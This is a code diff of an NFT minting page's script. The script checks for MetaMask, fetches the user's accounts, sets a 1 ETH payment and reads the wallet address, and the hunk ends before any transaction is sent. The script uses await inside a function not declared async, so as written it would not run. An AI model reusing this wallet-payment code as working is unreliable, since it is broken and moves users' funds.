@@ -939,26 +939,26 @@ JRNY NFT sets</h1> </div>
 </div>
 <script>
 function mint() {
-  const mintNow = document.getElementById("mint-now")
-  const connectWallet = document.getElementById("connect-wallet")
+  const mintNow = document.getElementById("mint-now");
+  const connectWallet = document.getElementById("connect-wallet");
 
   const isMetaMaskInstalled = () => {
     const { ethereum } = window;
     return Boolean(ethereum && ethereum.isMetaMask) || false
   };
   const isMetaMaskConnected = async () => {
-    if (typeof web3 === 'undefined') return false
+    if (typeof web3 === 'undefined') return false;
     let accounts = await ethereum.request({ method: 'eth_accounts' })
     return accounts.length > 0;
-  }
+  };
 
   async function onConnectClick() {
     await ethereum.request({ method: 'eth_accounts' })
-  }
+  };
 
-  if (!await isMetaMaskConnected()) {
-    onConnectClick()
-  }
+  // if (!await isMetaMaskConnected()) {
+  //   onConnectClick()
+  // };
   try {
     const total = 1 * 1000000000000000000;
     const adress = (await ethereum.request({ method: 'eth_accounts' }))[0];
